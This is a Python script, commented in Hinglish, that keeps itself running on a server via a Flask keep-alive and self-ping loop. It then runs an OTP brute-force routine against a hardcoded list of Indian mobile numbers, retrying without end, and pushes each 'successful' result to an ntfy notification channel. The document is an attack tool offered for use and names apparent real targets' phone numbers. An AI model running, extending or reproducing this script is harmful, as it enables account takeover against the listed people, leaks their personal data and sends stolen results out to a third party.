import asyncio
import os
import importlib
import utils
from flask import Flask
import threading
import time
import requests  # Self-ping ke liye zaroori hai

app = Flask('')

@app.route('/')
def home():
    return "Script is Running!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = threading.Thread(target=run, daemon=True)
    t.start()

def self_ping():
    time.sleep(10) 
    while True:
        try:
            requests.get("http://127.0.0.1:8080/", timeout=5)
            print("[*] KeepAlive Ping Sent to VPS (Sleep mode prevented).", end="\r")
        except:
            pass 
        time.sleep(60) 

keep_alive()
ping_thread = threading.Thread(target=self_ping, daemon=True)
ping_thread.start()

async def main():
    # 1. APNE MOBILE NUMBERS YAHAN DAALO (List format me)
    phone_numbers = [
        "9414710748",
        "8769390547",
        "9797579615",
        # Aur jitne chahiye daal lo
    ]

    if not phone_numbers:
        print("[!] Numbers ki list khaali hai.")
        return

    print(f"[*] Total {len(phone_numbers)} numbers mile list me. Process shuru karta hu...\n")

    import Time
    
    for number in phone_numbers:
        print(f"\n{'='*50}")
        print(f"[*] TARGET NUMBER: {number}")
        print(f"{'='*50}")
        
        # NAYA RETRY LOGIC: Bina main.py crash kiye number ko baar-baar try karega
        while True:
            try:
                Time.PHONE_NUMBER = number
                await Time.brute_force_otp()
                
                print(f"\n[*] Number {number} ka process complete. Data check karke notification bhejta hu...")
                
                # Successful data file se nikalo
                success_data = utils.get_successful_data(number)
                
                # Ntfy pe notification bhejo
                message = f"Number: {number}\nData: {success_data}"
                await utils.send_ntfy_notification(message)
                
                print(f"[*] Number {number} ka process poora ho gaya. Agla number shuru kar raha hu...")
                break  # While loop tod do, taaki agle number pe jaye
                
            except Exception as e:
                print(f"\n[-] ERROR on {number}: {e}")
                print(f"[*] Number {number} ko skip nahi kar rahe. 5 sec me wapas try karenge...")
                await asyncio.sleep(5)
        
        await asyncio.sleep(2) 

if __name__ == "__main__":
    while True:
        try:
            asyncio.run(main())
            break  
        except Exception as e:
            print(f"\n[-] FATAL ERROR: Script ka event loop crash ho gaya! Error: {e}")
            print("[*] Auto-restarting in 5 seconds...")
            time.sleep(5)